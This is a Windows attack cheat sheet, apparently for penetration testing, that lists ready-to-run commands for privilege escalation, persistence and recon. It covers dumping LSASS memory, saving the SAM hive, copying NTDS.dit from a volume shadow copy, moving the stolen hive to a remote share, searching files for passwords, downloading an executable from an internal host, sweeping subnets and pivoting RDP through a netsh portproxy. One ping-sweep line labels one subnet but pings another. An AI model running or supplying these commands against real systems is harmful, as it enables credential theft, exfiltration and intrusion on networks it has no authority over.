# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Powershell - List running processes
```
tasklist /svc
```
## Powershell - Search for "password" in files
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Display LSASS process information
```
Get-Process lsass
```

## Create LSASS memory dump
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## reg.exe - Save a copy of a registry hive
```
reg.exe save hklm\sam C:\sam.save
```

## regsvr32 - Register DLL
```
regsvr32.exe SocksOverRDP-Plugin.dll
```

## Transfer file to a file share
```
move sam.save \\<ip>\NameofFileShare
```

## cmd.exe - Copy NTDS.dit from shadow copy
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## vssadmin - Create volume shadow copy
```
vssadmin CREATE SHADOW /For=C:
```

## Invoke-WebRequest - Download file
```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

## Discover devices on network (Windows)
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

## PowerShell - Ping network segment
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```
## netsh - Configure portproxy rule
```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

## netsh - View portproxy rule
```
netsh.exe interface portproxy show v4tov4
```
